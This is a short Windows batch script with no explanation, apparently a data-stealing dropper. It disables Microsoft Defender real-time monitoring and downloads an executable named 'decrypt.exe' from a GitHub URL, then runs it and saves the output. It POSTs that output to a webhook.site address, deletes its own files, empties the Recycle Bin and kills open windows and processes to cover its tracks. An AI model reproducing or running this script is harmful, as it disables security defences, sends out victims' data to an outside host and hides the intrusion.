start cmd.exe /k  "powershell -command Set-MpPreference -DisableRealtimeMonitoring $true;"
timeout /t 2

start cmd.exe /k  "powershell -command mkdir -p C:/Users/Decrypt;"
timeout /t 2

start cmd.exe /k  "powershell -command "$url = 'https://github.com/mortingenstrasse95/mng/raw/main/decrypt.exe'; $output = 'C:/Users/Decrypt/decrypt.exe'; $start_time = Get-Date; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($url, $output); Write-Output 'Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)';"

timeout /t 10

start cmd.exe /k powershell -command "C:/Users/Decrypt/decrypt.exe | Out-File -FilePath C:/Users/Decrypt/decrypt.txt;"

timeout /t 10

start cmd.exe /k powershell -command Invoke-WebRequest -Uri https://webhook.site/9e77cc1f-f6be-45f8-8b43-db68f09de27d -Method POST -InFile C:/Users/Decrypt/decrypt.txt;"

timeout /t 5

start cmd.exe /k powershell -command Remove-Item -path c:\Users\Decrypt, c:\Users\decrypt.bat -recurse;"

timeout /t 5

start cmd.exe /k powershell -command Clear-RecycleBin -Force;"

timeout /t 2

start cmd.exe /k powershell -command "(New-Object -comObject Shell.Application).Windows() | foreach-object {$_.quit()}; Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | stop-process"
timeout /t 5

exit
